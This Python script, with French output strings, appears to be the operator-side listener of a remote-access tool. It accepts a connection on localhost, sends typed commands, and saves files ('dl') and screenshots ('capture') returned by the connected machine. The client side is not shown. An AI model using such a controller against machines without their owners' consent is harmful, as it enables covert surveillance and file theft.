
import socket

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

s = socket.socket()
s.bind((HOST_IP, HOST_PORT))
s.listen()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

print(f"Attente de connexion de {HOST_IP} port: {HOST_PORT}")
connexion_socket, client_adresse = s.accept()
print("connecter ")


def socket_receive_all_data(socket_p, data_len):

    current_data_len = 0
    total_data_receive = None

    while current_data_len < data_len:
        chunk_len = data_len - current_data_len

        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        datas_brut = socket_p.recv(chunk_len)

        if not datas_brut:
            return None

        if not total_data_receive:
            total_data_receive = datas_brut
        else:
            total_data_receive += datas_brut

        current_data_len += len(datas_brut)
        #print(data_len)
        #print("total data: " + total_data_receive.decode())
    return total_data_receive


def send_command_and_receive_all_data(socket_p, command):

    if command == "":
        return None

    socket_p.sendall(command.encode())
    header = socket_receive_all_data(socket_p, 13)
    data_len = int(header.decode())
    datas = socket_receive_all_data(socket_p, data_len)
    return datas

dl_filename = None

while True:
    
    infos_data = send_command_and_receive_all_data(connexion_socket, "infos")
    if not infos_data:
        break
    commande = input(f"IP: {client_adresse[0]} - Port: {client_adresse[1]} - {infos_data.decode()}\ncommande > ")
    commande_split = commande.split(" ")
    if len(commande_split) == 2 and commande_split[0] == "dl":
        dl_filename = commande_split[1]

    if len(commande_split) == 2 and commande_split[0] == "capture":
        dl_filename = commande_split[1] + ".png"

    datas = send_command_and_receive_all_data(connexion_socket, commande)
    if not datas:
        continue
    print()
    if dl_filename:
        f = open(dl_filename, "wb")
        f.write(datas)
        f.close()
        print(f"Fichier {dl_filename} telecharger")
        dl_filename = None
    else:
        print(datas.decode())
        print("longeur encode:", len(datas))
        print("longeur decode:", len(datas.decode()))
        print()
        



s.close()
connexion_socket.close()









        